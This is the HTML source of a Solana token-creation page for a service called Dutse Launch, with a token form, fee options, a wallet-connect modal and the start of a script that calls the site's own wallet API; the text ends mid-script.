<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Create Token - Dutse Launch</title>
  
  <!-- Dutse Launch Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  
  <!-- Favicon -->
  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
  <link rel="icon" type="image/png" href="/favicon.png">
  <link rel="apple-touch-icon" href="/logo.svg">
  
  <meta name="description" content="Create and deploy your Solana token effortlessly in seconds with Dutse Launch" />
  
  <!-- Solana Web3.js Library -->
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
  <script>
    // Make solanaWeb3 available globally
    window.solanaWeb3 = solanaWeb3;
  </script>
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #0a0a0a;
      color: #fff;
      line-height: 1.6;
      font-size: 14px;
    }
    
    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 20px;
    }
    
    /* Navigation */
    nav {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 0;
      border-bottom: 1px solid rgba(255, 107, 53, 0.2);
    }
    
    .nav-logo {
      font-size: 1.4em;
      font-weight: bold;
      color: #ff6b35;
      text-decoration: none;
    }
    
    .nav-links {
      display: flex;
      gap: 30px;
    }
    
    .nav-link {
      color: #fff;
      text-decoration: none;
      font-weight: 500;
      transition: color 0.3s ease;
    }
    
    .nav-link:hover {
      color: #ff6b35;
    }
    
    .nav-btn {
      background: linear-gradient(45deg, #ff6b35, #f7931e);
      color: white;
      padding: 12px 24px;
      border: none;
      border-radius: 12px;
      font-weight: 600;
      font-size: 14px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(255, 107, 53, 0.3);
    }
    .nav-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(255, 107, 53, 0.4);
    }
    
    /* Main Content */
    .create-token-page {
      padding: 60px 0;
    }
    
    .page-header {
      text-align: center;
      margin-bottom: 60px;
    }
    
    .page-header h1 {
      font-size: 2.2em;
      font-weight: 800;
      color: #ff6b35;
      margin-bottom: 20px;
      letter-spacing: -0.02em;
    }
    
    .page-header p {
      font-size: 1.1em;
      color: #ccc;
      max-width: 800px;
      margin: 0 auto;
    }
    
    /* Form Container */
    .form-container {
      background: rgba(255, 107, 53, 0.05);
      border: 1px solid rgba(255, 107, 53, 0.2);
      border-radius: 20px;
      padding: 40px;
      margin-bottom: 40px;
      backdrop-filter: blur(10px);
    }
    
    .form-section {
      margin-bottom: 40px;
    }
    
    .form-row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 20px;
      margin-bottom: 25px;
    }
    
    .form-row .form-group {
      margin-bottom: 0;
    }
    
    .form-row-single {
      grid-column: 1 / -1;
    }
    
    .form-section h3 {
      font-size: 1.2em;
      color: #ff6b35;
      margin-bottom: 20px;
      font-weight: 600;
    }
    
    .form-group {
      margin-bottom: 25px;
    }
    
    .form-group label {
      display: block;
      color: #ff6b35;
      font-weight: 600;
      margin-bottom: 8px;
      font-size: 0.95em;
    }
    
    .form-group input, .form-group textarea, .form-group select {
      width: 100%;
      padding: 15px;
      border: 2px solid rgba(255, 107, 53, 0.3);
      border-radius: 12px;
      background: rgba(255, 255, 255, 0.05);
      color: #fff;
      font-size: 1em;
      transition: all 0.3s ease;
    }
    
    .form-group input:focus, .form-group textarea:focus, .form-group select:focus {
      outline: none;
      border-color: #ff6b35;
      background: rgba(255, 107, 53, 0.1);
    }
    
    .form-group input::placeholder, .form-group textarea::placeholder {
      color: #888;
    }
    
    .form-group .help-text {
      color: #888;
      font-size: 0.9em;
      margin-top: 5px;
    }
    
    /* File Upload */
    .file-upload {
      border: 2px dashed rgba(255, 107, 53, 0.3);
      border-radius: 12px;
      padding: 40px;
      text-align: center;
      background: rgba(255, 107, 53, 0.05);
      transition: all 0.3s ease;
      cursor: pointer;
    }
    
    .file-upload:hover {
      border-color: #ff6b35;
      background: rgba(255, 107, 53, 0.1);
    }
    
    .file-upload.dragover {
      border-color: #ff6b35;
      background: rgba(255, 107, 53, 0.1);
    }
    
    .file-upload-icon {
      font-size: 3em;
      color: #ff6b35;
      margin-bottom: 15px;
    }
    
    .file-upload-text {
      color: #fff;
      font-size: 1.1em;
      margin-bottom: 10px;
    }
    
    .file-upload-subtext {
      color: #888;
      font-size: 0.9em;
    }
    
    /* AI Logo Generation */
    .ai-logo-section {
      background: rgba(255, 215, 0, 0.1);
      border: 1px solid rgba(255, 215, 0, 0.3);
      border-radius: 12px;
      padding: 20px;
      margin-top: 15px;
    }
    
    .ai-logo-button {
      background: linear-gradient(45deg, #ffd700, #ffed4e);
      color: #000;
      border: none;
      padding: 12px 24px;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    
    .ai-logo-button:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(255, 215, 0, 0.3);
    }
    
    /* Optional Sections */
    .optional-section {
      background: rgba(255, 107, 53, 0.05);
      border: 1px solid rgba(255, 107, 53, 0.2);
      border-radius: 12px;
      padding: 20px;
      margin-bottom: 20px;
    }
    
    .optional-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 15px;
    }
    
    .optional-title {
      color: #ff6b35;
      font-weight: 600;
    }
    
    .optional-price {
      color: #ffd700;
      font-weight: 600;
    }
    
    /* Authority Options */
    .authority-options {
      display: flex;
      flex-direction: column;
      gap: 20px;
      margin-top: 20px;
    }
    
    .authority-option {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: rgba(255, 107, 53, 0.05);
      border: 1px solid rgba(255, 107, 53, 0.2);
      border-radius: 12px;
      padding: 20px;
    }
    
    .authority-info h4 {
      color: #ff6b35;
      font-size: 1.1em;
      margin-bottom: 5px;
    }
    
    .authority-info p {
      color: #ccc;
      font-size: 0.9em;
      margin-bottom: 5px;
    }
    
    .authority-price {
      color: #ffd700;
      font-weight: 600;
      font-size: 0.9em;
    }
    
    /* Toggle Switch */
    .toggle-switch {
      position: relative;
      display: inline-block;
      width: 50px;
      height: 24px;
    }
    
    .toggle-switch input {
      opacity: 0;
      width: 0;
      height: 0;
    }
    
    .toggle-slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: rgba(255, 255, 255, 0.2);
      transition: .4s;
      border-radius: 24px;
    }
    
    .toggle-slider:before {
      position: absolute;
      content: "";
      height: 18px;
      width: 18px;
      left: 3px;
      bottom: 3px;
      background-color: white;
      transition: .4s;
      border-radius: 50%;
    }
    
    input:checked + .toggle-slider {
      background-color: #ff6b35;
    }
    
    input:checked + .toggle-slider:before {
      transform: translateX(26px);
    }
    
    /* Liquidity Toggle */
    .liquidity-toggle {
      display: flex;
      align-items: center;
      gap: 15px;
      margin: 20px 0;
      padding: 15px;
      background: rgba(255, 107, 53, 0.05);
      border-radius: 8px;
    }
    
    .toggle-label {
      color: #fff;
      font-weight: 500;
      cursor: pointer;
    }
    
    /* Liquidity Form */
    .liquidity-form {
      margin-top: 20px;
      background: rgba(255, 107, 53, 0.05);
      border-radius: 8px;
      padding: 20px;
      display: grid;
      grid-template-columns: 1fr 1fr 1fr;
      gap: 20px;
      animation: slideDown 0.3s ease;
    }
    
    .liquidity-input-group {
      display: flex;
      flex-direction: column;
    }
    
    .liquidity-input-group label {
      color: #ff6b35;
      font-weight: 600;
      margin-bottom: 8px;
      font-size: 0.9em;
    }
    
    .liquidity-input-group input,
    .liquidity-input-group select {
      width: 100%;
      padding: 12px;
      border: 2px solid rgba(255, 107, 53, 0.3);
      border-radius: 8px;
      background: rgba(255, 255, 255, 0.05);
      color: #fff;
      font-size: 0.9em;
      transition: all 0.3s ease;
    }
    
    .liquidity-input-group input:focus,
    .liquidity-input-group select:focus {
      outline: none;
      border-color: #ff6b35;
      background: rgba(255, 107, 53, 0.1);
    }
    
    .liquidity-input-group input::placeholder {
      color: #888;
    }
    
    .liquidity-input-group select {
      cursor: pointer;
    }
    
    .liquidity-input-group select option {
      background: #1a1a1a;
      color: #fff;
    }
    
    @keyframes slideDown {
      from {
        opacity: 0;
        transform: translateY(-10px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    /* Launch Button */
    .launch-section {
      background: rgba(255, 107, 53, 0.1);
      border: 2px solid rgba(255, 107, 53, 0.3);
      border-radius: 20px;
      padding: 40px;
      text-align: center;
      margin-top: 40px;
    }
    
    .launch-button {
      background: linear-gradient(45deg, #ff6b35, #f7931e);
      color: white;
      border: none;
      padding: 20px 60px;
      border-radius: 12px;
      font-size: 1.1em;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 1px;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 6px 20px rgba(255, 107, 53, 0.3);
      margin-bottom: 20px;
    }
    
    .launch-button:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 30px rgba(255, 107, 53, 0.4);
    }
    
    .total-fees {
      color: #ff6b35;
      font-size: 1em;
      font-weight: 600;
    }
    
    .wallet-status {
      background: rgba(255, 107, 53, 0.1);
      border: 1px solid rgba(255, 107, 53, 0.3);
      border-radius: 12px;
      padding: 20px;
      margin-bottom: 20px;
      text-align: center;
    }
    
    .wallet-status p {
      color: #fff;
      margin-bottom: 15px;
    }
    
    .connect-wallet-btn {
      background: linear-gradient(45deg, #ff6b35, #f7931e);
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    
    .connect-wallet-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(255, 107, 53, 0.3);
    }
    
    .launch-button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
      transform: none;
    }
    
    .launch-button:disabled:hover {
      transform: none;
      box-shadow: none;
    }
    
    /* Footer */
    .footer {
      text-align: center;
      padding: 40px 0;
      border-top: 1px solid rgba(255, 107, 53, 0.2);
      margin-top: 60px;
    }
    
    .footer p {
      color: #888;
      margin-bottom: 10px;
    }
    
    .footer a {
      color: #ff6b35;
      text-decoration: none;
    }
    
    .footer a:hover {
      text-decoration: underline;
    }
    
    /* Custom Modals */
    .custom-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 2000;
      animation: fadeIn 0.3s ease;
    }
    
    .modal-content {
      background: #1a1a1a;
      border: 2px solid #ff6b35;
      border-radius: 20px;
      max-width: 500px;
      width: 90%;
      max-height: 80vh;
      overflow-y: auto;
      animation: slideIn 0.3s ease;
    }
    
    .modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 30px;
      border-bottom: 1px solid rgba(255, 107, 53, 0.2);
    }
    
    .modal-header h3 {
      color: #ff6b35;
      margin: 0;
      font-size: 1.1em;
    }
    
    .modal-body {
      padding: 30px;
    }
    
    .modal-body p {
      color: #fff;
      margin-bottom: 15px;
      line-height: 1.6;
    }
    
    .error-list {
      color: #ff6b35;
      margin: 0;
      padding-left: 20px;
    }
    
    .error-list li {
      margin-bottom: 8px;
    }
    
    .modal-footer {
      padding: 20px 30px;
      border-top: 1px solid rgba(255, 107, 53, 0.2);
      text-align: right;
    }
    
    .modal-btn {
      background: #ff6b35;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    
    .modal-btn:hover {
      background: #e55a2b;
      transform: translateY(-2px);
    }
    
    .close-btn {
      background: none;
      border: none;
      color: #fff;
      font-size: 24px;
      cursor: pointer;
      padding: 0;
      width: 30px;
      height: 30px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      transition: all 0.3s ease;
    }
    
    .close-btn:hover {
      background: rgba(255, 107, 53, 0.2);
    }
    
    /* Modal Types */
    .error-modal .modal-content {
      border-color: #ff4444;
    }
    
    .error-modal .modal-header h3 {
      color: #ff4444;
    }
    
    .success-modal .modal-content {
      border-color: #44ff44;
    }
    
    .success-modal .modal-header h3 {
      color: #44ff44;
    }
    
    .info-modal .modal-content {
      border-color: #4488ff;
    }
    
    .info-modal .modal-header h3 {
      color: #4488ff;
    }
    
    /* Token Creation Modals */
    .token-creation-modal, .processing-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 2000;
      animation: fadeIn 0.3s ease;
    }
    
    .creation-steps {
      margin: 20px 0;
    }
    
    .step {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
      opacity: 0.5;
      transition: all 0.3s ease;
    }
    
    .step.active {
      opacity: 1;
    }
    
    .step-icon {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background: rgba(255, 107, 53, 0.2);
      border: 2px solid #ff6b35;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      color: #ff6b35;
      margin-right: 15px;
    }
    
    .step.active .step-icon {
      background: #ff6b35;
      color: white;
    }
    
    .step-content h4 {
      color: #ff6b35;
      margin: 0 0 5px 0;
      font-size: 1.1em;
    }
    
    .step-content p {
      color: #ccc;
      margin: 0;
      font-size: 0.9em;
    }
    
    .fee-info {
      background: rgba(255, 107, 53, 0.1);
      border: 1px solid rgba(255, 107, 53, 0.3);
      border-radius: 8px;
      padding: 15px;
      margin: 20px 0;
    }
    
    .fee-info p {
      margin: 5px 0;
      color: #fff;
    }
    
    .processing-animation {
      text-align: center;
      margin: 30px 0;
    }
    
    .spinner {
      width: 50px;
      height: 50px;
      border: 4px solid rgba(255, 107, 53, 0.2);
      border-top: 4px solid #ff6b35;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    
    .status-message {
      background: rgba(255, 107, 53, 0.1);
      border-radius: 8px;
      padding: 15px;
      margin-top: 20px;
    }
    
    .status-message p {
      color: #ccc;
      margin: 0;
      font-size: 0.9em;
    }
    
    /* Animations */
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    
    @keyframes slideIn {
      from { 
        opacity: 0;
        transform: translateY(-50px) scale(0.9);
      }
      to { 
        opacity: 1;
        transform: translateY(0) scale(1);
      }
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    /* Wallet Modal Styles - Copied from main page */
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(4px);
      justify-content: center;
      align-items: center;
      z-index: 9999;
      /* Hardware acceleration for smooth animations */
      transform: translateZ(0);
      -webkit-transform: translateZ(0);
    }
    .modal.active {
      display: flex;
    }
        .wallet-box {
            background: #ffffff;
            border-radius: 16px;
            padding: 0;
            width: 320px;
            max-width: 320px;
            text-align: left;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
            margin: 0 auto;
            /* Perfect centering within modal */
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            -webkit-transform: translate(-50%, -50%);
        }
    
            .modal-header {
            margin: 0;
            padding: 8px 20px 8px 20px;
            border-bottom: 1px solid #f0f0f0;
            background: #ffffff;
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
        }
        
        .header-content h3 {
            margin: 0;
            font-size: 18px;
            font-weight: 600;
            color: #1a1a1a;
            line-height: 1.2;
        }
        
        .header-subtitle {
            margin: 4px 0 0 0;
            font-size: 12px;
            color: #666;
            line-height: 1.3;
        }
        
        .close-btn {
            background: none;
            border: none;
            color: #666;
            cursor: pointer;
            padding: 4px;
            border-radius: 4px;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .close-btn:hover {
            background: #f0f0f0;
            color: #333;
        }
    
            .wallet-options {
            padding: 6px 20px;
        }
        
        .wallet-option {
            display: flex;
            align-items: center;
            gap: 8px;
            background: #ffffff;
            padding: 6px 16px;
            margin: 0 0 4px 0;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s ease;
            border: 1px solid #f0f0f0;
        }
        
        .wallet-option:last-child {
            margin-bottom: 0;
        }
        
        .wallet-option:hover, .wallet-option:focus {
            background: #f9fafb;
            border-color: #e5e7eb;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
        }
        
        .wallet-icon {
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        
        .wallet-icon img {
            width: 20px;
            height: 20px;
            object-fit: contain;
            border-radius: 4px;
        }
        
        .wallet-info {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 2px;
        }
        
        .wallet-name {
            font-size: 14px;
            font-weight: 500;
            color: #1a1a1a;
            line-height: 1.2;
        }
        
        .wallet-description {
            font-size: 12px;
            color: #666;
            line-height: 1.3;
        }
        
        .wallet-arrow {
            color: #ccc;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .wallet-option:hover .wallet-arrow {
            color: #374151;
            transform: translateX(2px);
        }
        
        .wallet-arrow svg {
            width: 20px;
            height: 20px;
        }
    
            .modal-footer {
            padding: 8px 20px 12px 20px;
            border-top: 1px solid #f0f0f0;
            background: #fafafa;
            text-align: center;
        }
        
        .footer-content {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        
        .wallet-help {
            font-size: 12px;
            color: #666;
            margin: 0;
        }
        
        .wallet-links {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        .wallet-link {
            font-size: 12px;
            color: #ff6b35;
            text-decoration: none;
            transition: color 0.2s ease;
        }
        
        .wallet-link:hover {
            color: #e55a2b;
        }
        
        .separator {
            color: #ccc;
            font-size: 12px;
        }
    
    /* Responsive */
    @media (max-width: 768px) {
      .container {
        padding: 0 15px;
      }
      
      .page-header h1 {
        font-size: 1.8em;
      }
      
      .form-container {
        padding: 20px;
      }
      
      .nav-links {
        display: none;
      }
      
      .modal-content {
        width: 95%;
        margin: 20px;
      }
      
      .modal-header, .modal-body, .modal-footer {
        padding: 15px 20px;
      }
      
      .liquidity-form {
        grid-template-columns: 1fr;
        gap: 15px;
      }
      
      .form-row {
        grid-template-columns: 1fr;
        gap: 15px;
      }
    }
    
    /* Alert Modal Styles */
    .alert-modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 10000;
      animation: fadeIn 0.3s ease;
    }
    
    .alert-modal {
      background: #1a1a1a;
      border-radius: 12px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
      max-width: 400px;
      width: 90%;
      animation: slideIn 0.3s ease;
    }
    
    .alert-modal-header {
      padding: 20px 25px 15px;
      border-bottom: 1px solid #333;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    
    .alert-modal-header.success {
      background: linear-gradient(135deg, #51cf66, #40c057);
    }
    
    .alert-modal-header.error {
      background: linear-gradient(135deg, #ff6b6b, #ff5252);
    }
    
    .alert-modal-header h3 {
      color: white;
      font-size: 1.2em;
      font-weight: 600;
      margin: 0;
    }
    
    .alert-modal-close {
      background: none;
      border: none;
      color: white;
      font-size: 1.5em;
      cursor: pointer;
      padding: 0;
      width: 30px;
      height: 30px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      transition: background 0.2s ease;
    }
    
    .alert-modal-close:hover {
      background: rgba(255, 255, 255, 0.2);
    }
    
    .alert-modal-body {
      padding: 25px;
    }
    
    .alert-modal-body p {
      color: #e0e0e0;
      font-size: 1em;
      line-height: 1.5;
      margin: 0;
    }
    
    .alert-modal-footer {
      padding: 15px 25px 25px;
      text-align: right;
    }
    
    .alert-modal-btn {
      background: linear-gradient(135deg, #ff6b35, #f7931e);
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 8px;
      font-size: 1em;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s ease;
    }
    
    .alert-modal-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(255, 107, 53, 0.3);
    }
    
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    
    @keyframes slideIn {
      from { 
        opacity: 0;
        transform: translateY(-20px) scale(0.95);
      }
      to { 
        opacity: 1;
        transform: translateY(0) scale(1);
      }
    }
  </style>
</head>
<body>
  <nav>
    <a href="/" class="nav-logo"><img src="/logo.svg" alt="Dutse Launch Logo" style="height:28px;vertical-align:middle;margin-right:8px;">Dutse Launch</a>
    <div class="nav-links">
      <a href="/" class="nav-link">Home</a>
      <a href="/#features" class="nav-link">Features</a>
      <a href="/#faq" class="nav-link">FAQ</a>
      <a href="https://discord.gg/dutseSupport" class="nav-link" target="_blank" rel="noopener noreferrer">Support</a>
    </div>
    <button class="nav-btn" onclick="openWalletModal()">Connect Wallet</button>
  </nav>

  <div class="create-token-page">
    <div class="container">
      <div class="page-header">
        <h1>Solana Token Creator</h1>
        <p>Create and deploy your Solana coin effortlessly in seconds.<br>Reach the world and scale without limits!</p>
      </div>

      <div class="form-container">
        <!-- Basic Token Information -->
        <div class="form-section">
          <h3>Token Information</h3>
          
          <div class="form-row">
            <div class="form-group">
              <label for="tokenName">Token Name *</label>
              <input type="text" id="tokenName" placeholder="Ex: Trump Coin" maxlength="32" required>
              <div class="help-text">Max 32 characters in your name</div>
            </div>
            
            <div class="form-group">
              <label for="tokenSymbol">Token Symbol *</label>
              <input type="text" id="tokenSymbol" placeholder="Ex: SOL" maxlength="10" required>
            </div>
          </div>
          
          <div class="form-row">
            <div class="form-group">
              <label for="decimals">Decimals *</label>
              <input type="number" id="decimals" value="9" min="0" max="9" required>
              <div class="help-text">Change the number of decimals for your token</div>
            </div>
            
            <div class="form-group">
              <label for="supply">Supply *</label>
              <input type="number" id="supply" value="1000000" min="1" required>
              <div class="help-text">The initial number of available tokens that will be created in your wallet</div>
            </div>
          </div>
        </div>

        <!-- Logo Upload -->
        <div class="form-section">
          <h3>Logo *</h3>
          <div class="file-upload" id="logoUpload">
            <div class="file-upload-icon">🖼️</div>
            <div class="file-upload-text">Drag and drop here to upload</div>
            <div class="file-upload-subtext">.png, .jpg 1000x1000 px</div>
            <div class="help-text">Add logo for your token or use AI to Generate one for you!</div>
          </div>
          
          <div class="ai-logo-section">
            <button class="ai-logo-button">Generate Personalized AI Logo</button>
            <div class="help-text">COMING SOON 🖼️ (At just 0.05 SOL)</div>
          </div>
        </div>

        <!-- Description -->
        <div class="form-section">
          <div class="form-group">
            <label for="description">Description *</label>
            <textarea id="description" rows="4" placeholder="Here you can describe your token"></textarea>
          </div>
        </div>

        <!-- Creator's Info (Optional) -->
        <div class="form-section">
          <div class="optional-section">
            <div class="optional-header">
              <h3 class="optional-title">Creator's Info (Optional)</h3>
              <span class="optional-price">+0.1 SOL</span>
            </div>
            <div class="help-text">Change the information of the creator in the metadata. By default, it is Dutse Launch.</div>
            
            <div class="form-row">
              <div class="form-group">
                <label for="creatorAddress">Creator's Address *</label>
                <input type="text" id="creatorAddress" placeholder="Ex: Your Solana address">
              </div>
              
              <div class="form-group">
                <label for="creatorName">Creator's Name *</label>
                <input type="text" id="creatorName" placeholder="Ex: Dutse Launch">
              </div>
            </div>
          </div>
        </div>

        <!-- Social Links & Tags (Optional) -->
        <div class="form-section">
          <div class="optional-section">
            <div class="optional-header">
              <h3 class="optional-title">Add Social Links & Tags</h3>
              <span class="optional-price">+0.1 SOL</span>
            </div>
            <div class="help-text">Add links to your token metadata.</div>
            
            <div class="form-row">
              <div class="form-group">
                <label for="telegramLink">Telegram Link *</label>
                <input type="url" id="telegramLink" placeholder="Ex: https://t.me/lunalaunch">
              </div>
              
              <div class="form-group">
                <label for="twitterLink">Twitter or X Link *</label>
                <input type="url" id="twitterLink" placeholder="Ex: https://x.com/@lunalaunch">
              </div>
            </div>
            
            <div class="form-row">
              <div class="form-group">
                <label for="websiteLink">Website Link *</label>
                <input type="url" id="websiteLink" placeholder="Ex: https://www.lunalaunch.com">
              </div>
              
              <div class="form-group">
                <!-- Empty space for alignment -->
              </div>
            </div>
          </div>
        </div>

        <!-- Dutse Liquidity Pool -->
        <div class="form-section">
        <div class="optional-section">
          <div class="optional-header">
            <h3 class="optional-title">Dutse Liquidity Pool</h3>
            <span class="optional-price">+0 SOL (FREE)</span>
          </div>
          <div class="help-text">Full access to the liquidity pool. <a href="/manage-liquidity.html" style="color: #ff6b35; text-decoration: underline;">Manage liquidity after creation</a></div>
            
            <div class="liquidity-toggle">
              <label class="toggle-switch">
                <input type="checkbox" id="liquidityPool" onchange="toggleLiquidityPool()">
                <span class="toggle-slider"></span>
              </label>
              <span class="toggle-label">Enable Dutse Liquidity Pool</span>
            </div>
            
            <div class="liquidity-form" id="liquidityForm" style="display: none;">
              <div class="liquidity-input-group">
                <label for="solAmount">Sol</label>
                <input type="number" id="solAmount" placeholder="Ex: 3" min="0" step="0.1">
              </div>
              
              <div class="liquidity-input-group">
                <label for="tokenAmount">Token</label>
                <input type="number" id="tokenAmount" placeholder="Ex: 5000000" min="0" step="1">
              </div>
              
              <div class="liquidity-input-group">
                <label for="feeTier">Fee Tier</label>
                <select id="feeTier">
                  <option value="0">0%</option>
                  <option value="2">2%</option>
                  <option value="4">4%</option>
                  <option value="6">6%</option>
                </select>
              </div>
            </div>
          </div>
        </div>

        <!-- Revoke Authorities -->
        <div class="form-section">
          <h3>Revoke Authorities (Investor's Booster)</h3>
          <div class="help-text">Solana Token has 3 authorities: Freeze Authority, Mint Authority, and Update Authority. Revoke them to attract more investors.</div>
          
          <div class="authority-options">
            <div class="authority-option">
              <div class="authority-info">
                <h4>Revoke Freeze</h4>
                <p>No one will be able to freeze holders' token accounts anymore</p>
                <span class="authority-price">+0.1 SOL</span>
              </div>
              <label class="toggle-switch">
                <input type="checkbox" id="revokeFreeze">
                <span class="toggle-slider"></span>
              </label>
            </div>
            
            <div class="authority-option">
              <div class="authority-info">
                <h4>Revoke Mint</h4>
                <p>No one will be able to create more tokens anymore</p>
                <span class="authority-price">+0.1 SOL</span>
              </div>
              <label class="toggle-switch">
                <input type="checkbox" id="revokeMint">
                <span class="toggle-slider"></span>
              </label>
            </div>
            
            <div class="authority-option">
              <div class="authority-info">
                <h4>Revoke Update</h4>
                <p>No one will be able to modify token metadata anymore</p>
                <span class="authority-price">+0.1 SOL</span>
              </div>
              <label class="toggle-switch">
                <input type="checkbox" id="revokeUpdate">
                <span class="toggle-slider"></span>
              </label>
            </div>
          </div>
        </div>

        <!-- Token Recipient -->
        <div class="form-section">
          <div class="form-group">
            <label for="tokenRecipient">Enter token recipient *</label>
            <input type="text" id="tokenRecipient" placeholder="Enter address who will be the receiver of the token (owner)">
          </div>
        </div>
      </div>

      <!-- Launch Section -->
      <div class="launch-section">
        <div class="wallet-status" id="walletStatus">
          <p>Please connect your wallet to create a token</p>
        </div>
        <div class="status-display" id="statusDisplay" style="display: none; margin: 10px 0; padding: 10px; border-radius: 8px; text-align: center;">
          <p>Status: Ready</p>
        </div>
        <button class="launch-button" id="launchBtn" onclick="launchToken()" disabled>Launch Token</button>
        <div class="total-fees">Total Fees: 0.6 SOL <span style="text-decoration: line-through; color: #888;">0.2 SOL</span></div>
      </div>
    </div>
  </div>

  <!-- WalletConnect-style Web3Modal -->
  <div id="walletModal" class="modal">
      <div class="wallet-box">
          <div class="modal-header">
              <div class="header-content">
                  <h3>Connect Wallet</h3>
                  <p class="header-subtitle">Create and deploy your Solana token with Dutse Launch</p>
                  
              </div>
              <button class="close-btn" onclick="closeWalletModal()">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M18 6L6 18M6 6L18 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                  </svg>
              </button>
          </div>
          <div class="wallet-options">
              <!-- Wallet options will be dynamically loaded from backend -->
          </div>
          
          <div class="modal-footer">
              <div class="footer-content">
                  <p class="wallet-help">Don't have a wallet?</p>
                  <div class="wallet-links">
                      <a href="https://phantom.app/" target="_blank" class="wallet-link">Phantom</a>
                      <span class="separator">•</span>
                      <a href="https://solflare.com/" target="_blank" class="wallet-link">Solflare</a>
                      <span class="separator">•</span>
                      <a href="https://backpack.app/" target="_blank" class="wallet-link">Backpack</a>
                  </div>
              </div>
          </div>
      </div>
  </div>

  <div class="footer">
    <p>© Dutse Launch 2025</p>
    <p><a href="#">Terms of Service</a></p>
  </div>

  <script>
    // Wallet connection functions - Copied from main page
    // Get wallet modal data from backend
    async function getWalletModalData() {
      try {
        const response = await fetch('/api/wallet-management', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ operation: 'get_wallet_modal_data' })
        });
        
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const data = await response.json();
        return data;
      } catch (error) {
        console.error('[getWalletModalData] Error:', error);
        return { success: false, error: error.message };
      }
    }
    
    // Get wallet connection info from backend
    async function getWalletConnectionInfo(walletKey) {
      try {
        const response = await fetch('/api/wallet-management', {
